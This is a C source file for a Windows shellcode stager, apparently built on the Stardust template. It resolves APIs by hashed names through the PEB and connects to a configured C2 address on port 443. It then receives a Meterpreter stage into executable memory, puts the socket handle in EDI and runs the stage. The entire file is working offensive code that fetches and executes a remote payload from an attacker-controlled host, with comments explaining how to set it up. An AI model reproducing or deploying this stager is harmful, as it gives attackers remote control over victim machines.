#include <Common.h>
#include <Constexpr.h>
#pragma comment(lib, "ws2_32.lib")

LPWSTR* arglist;
// Define IP Adress of your C2 Stager (!)
#define IP_STR  "10.10.10.10"
// Define PORT 443 of your TCP Stager
#define PORT 443
// We dont have HTONS or HTONL, so we must define it manually
#define HTONS(x) ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )
#define HTONL(x) ( \
    ((x) << 24) | \
    (((x) << 8) & 0xFF0000) | \
    (((x) >> 8) & 0xFF00) | \
    ((x) >> 24) \
)

// We dont have inet_addr, so we need to manually calculate the binary definition of the IP Address from the define String
FUNC ULONG custom_inet_addr(
    _In_ UCHAR *ip_string
) {
    unsigned long ip_addr = 0;
    int octet = 0;
    int shift = 24;
    unsigned long num = 0;

    while (*ip_string) {
        if (*ip_string == '.') {
            ip_addr |= (num << shift);
            num = 0;
            shift -= 8;
            octet++;
        } else if (*ip_string >= '0' && *ip_string <= '9') {
            num = num * 10 + (*ip_string - '0');
            if (num > 255) {
                // Invalid IP address
                return 0;
            }
        } else {
            // Invalid character
            return 0;
        }
        ip_string++;
    }

    // Add the last octet
    ip_addr |= (num << shift);

    // Check if all four octets are present
    if (octet != 3) {
        // Invalid IP address
        return 0;
    }

    return ip_addr;
}

FUNC VOID Main(
    _In_ PVOID Param
) {
    STARDUST_INSTANCE

    PVOID Message = { 0 };

    //
    // resolve kernel32.dll related functions
    //
    if ( ( Instance()->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
        if ( ! ( Instance()->Win32.LoadLibraryW = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryW" ) ) ) ) {
            return;
        }
    }

    if ( ( Instance()->Modules.Kernel32 = Instance()->Win32.LoadLibraryW( L"Kernel32" ) ) ) {
        if ( ! ( Instance()->Win32.VirtualAlloc = LdrFunction( Instance()->Modules.Kernel32, HASH_STR( "VirtualAlloc" ) ) ) ) {
            return;
        }
    }

    //
    // resolve user32.dll related functions
    //
    if ( ( Instance()->Modules.User32 = Instance()->Win32.LoadLibraryW( L"User32" ) ) ) {
        if ( ! ( Instance()->Win32.MessageBoxW = LdrFunction( Instance()->Modules.User32, HASH_STR( "MessageBoxW" ) ) ) ) {
            return;
        }
    }

    if ( ( Instance()->Modules.User32 = Instance()->Win32.LoadLibraryW( L"User32" ) ) ) {
        if ( ! ( Instance()->Win32.MessageBoxA = LdrFunction( Instance()->Modules.User32, HASH_STR( "MessageBoxA" ) ) ) ) {
            return;
        } 
    }

    //
    // resolve ws2_32.dll related functions
    //
    if ( ( Instance()->Modules.ws2_32 = Instance()->Win32.LoadLibraryW( L"ws2_32" ) ) ) {
        if ( ! ( Instance()->Win32.WSAStartup = LdrFunction( Instance()->Modules.ws2_32, HASH_STR( "WSAStartup" ) ) ) ) {
            return;
        }
    }

    if ( ( Instance()->Modules.ws2_32 = Instance()->Win32.LoadLibraryW( L"ws2_32" ) ) ) {
        if ( ! ( Instance()->Win32.socket = LdrFunction( Instance()->Modules.ws2_32, HASH_STR( "socket" ) ) ) ) {
            return;
        }
    }
    if ( ( Instance()->Modules.ws2_32 = Instance()->Win32.LoadLibraryW( L"ws2_32" ) ) ) {
        if ( ! ( Instance()->Win32.connect = LdrFunction( Instance()->Modules.ws2_32, HASH_STR( "connect" ) ) ) ) {
            return;
        }
    }
    if ( ( Instance()->Modules.ws2_32 = Instance()->Win32.LoadLibraryW( L"ws2_32" ) ) ) {
        if ( ! ( Instance()->Win32.recv = LdrFunction( Instance()->Modules.ws2_32, HASH_STR( "recv" ) ) ) ) {
            return;
        }
    }

// the message from Cracked5pider will forever echo through the universe
    Message = NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer;


// Allright, lets start

// First we need to translate the IP Adress from String to Binary
   const char *ip_str = IP_STR;
   unsigned long ip_addr = custom_inet_addr(ip_str);
// Convert unsigned long IP address to in_addr structure
   struct in_addr ipStruct;
   ipStruct.s_addr = HTONL(ip_addr);
// Done calculating the IP, from now use ip_addr!

// Initiate WSA
//    Instance()->Win32.MessageBoxW( NULL, Message, L"Stardust starte WSAStartup", MB_OK );
   WSADATA wsaData;
   if (Instance()->Win32.WSAStartup(MAKEWORD(2, 0), &wsaData) != 0){
	Instance()->Win32.MessageBoxW( NULL, Message, L"WSAStartup Error", MB_OK );
	return -1;
        //exit(-1);
   }

// Initiate Socket
// Instance()->Win32.MessageBoxW( NULL, Message, L"Stardust Socket Initialization", MB_OK );
   SOCKET ConnectSocket = Instance()->Win32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
         Instance()->Win32.MessageBoxW( NULL, Message, L"Stardust Socket Failed", MB_OK );
        return 1;
    }

// Socket Setup with Protocol, Port and IP
   struct sockaddr_in clientService;
   clientService.sin_family = AF_INET;
// Copy the converted IP address to sockaddr_in structure
   memcpy(&clientService.sin_addr, &ipStruct, sizeof(ipStruct));
   clientService.sin_port = HTONS(PORT);

// Connect to Server
//Instance()->Win32.MessageBoxW( NULL, Message, L"Verbinde mit dem Server", MB_OK );
   if ( Instance()->Win32.connect(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
        Instance()->Win32.MessageBoxW( NULL, Message, L"Verbindung Failed", MB_OK );
        return 1;
   }

//////////////////////////////
// When reverse_tcp and bind_tcp are used, the multi/handler sends the size of the stage in the first 4 bytes before the stage itself
// So, we read first 4 bytes to use it for memory allocation calculations and write them to buffersize
//////////////////////////////
   int bufferSize;
   unsigned char *data;
// Receive the buffer size via first 4 bytes
   int recvResult = Instance()->Win32.recv(ConnectSocket, (char*)&bufferSize, 4, 0);
   if (recvResult <= 0) {
   // Handle recv error
   Instance()->Win32.MessageBoxW( NULL, Message, L"4 Byte recv Error", MB_OK );
   return 1;
}

// Now that we know the buffer size we can initialize Data
   data = (unsigned char*)Instance()->Win32.VirtualAlloc(NULL, bufferSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   if (data == NULL) {
    // Handle VirtualAlloc error
	Instance()->Win32.MessageBoxW( NULL, Message, L"Virtual Alloc Error", MB_OK );
    return 1;
}

// Q: why did we allocate bufsize+5? what's those extra 5 bytes?
// A: the Meterpreter stage is a large shellcode "ReflectiveDll", and when the stage gets executed, IT IS EXPECTING TO HAVE THE SOCKET NUMBER IN _EDI_ register.
//    so, we want the following to take place BEFORE executing the stage: "mov edi, [socket]"
//    opcode for "mov edi, imm32" is 0xBF
   data[0] = 0xbf; // opcode of "mov edi, WhateverFollows"

   memcpy(data + 1, &ConnectSocket, 4); // Adress of the socket

// now we fetch the remaining bytes the Socket still holds and write it to Data
   int location = 0;
   int received = 0;

   int remaining = bufferSize;
// Instance()->Win32.MessageBoxW( NULL, Message, L"Starting Filler", MB_OK );
// memcpy(data + 5, recv(buffer_socket, ((char*)(buf + 5 + location)), length, 0); , bufferSize);
// Instance()->Win32.recv(ConnectSocket, ((char*)(data + 5)), bufferSize, 0);
   while (remaining > 0){
	//Instance()->Win32.MessageBoxW( NULL, Message, L"Starting receive", MB_OK );
	received = Instance()->Win32.recv(ConnectSocket, (char*)(data + 5 + location), remaining, 0);
          if (received <= 0) {
           Instance()->Win32.MessageBoxW( NULL, Message, L"receive remaining Data error", MB_OK );
           return 1;
          }
   location += received;
   remaining -= received;
   }

//All done! Buckle up, we are ready to rumble!
   Instance()->Win32.MessageBoxW( NULL, Message, L"We are all made of Stardust!", MB_OK );
   ((void(*)())data)();

}
